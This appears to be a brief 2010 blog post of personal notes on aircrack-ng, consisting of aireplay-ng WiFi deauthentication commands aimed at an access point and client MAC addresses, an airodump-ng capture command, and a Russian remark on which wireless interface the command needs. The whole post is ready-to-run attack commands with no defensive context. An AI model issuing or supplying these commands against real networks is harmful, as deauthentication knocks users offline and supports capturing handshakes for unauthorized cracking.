---
layout: post
title:  "aircrack-ng2"
date:   2010-07-20 13:03:00 +0400
categories: wifi
tags: wifi
---

# aircrack-ng2
aireplay-ng wlan0 --deauth 5 -a AP_BSSID -c CLIENT_BSSID

airodump-ng -c5 mon0
aireplay mon0 -0 5 -a 4F:B1:A4:05:5C:21 -c 5B:23:15:00:C8:57

Внимание: эта команда — исключение и принимает идентификатор реального беспроводного адаптера, а не mon0, созданного с помощью airmon-ng. 
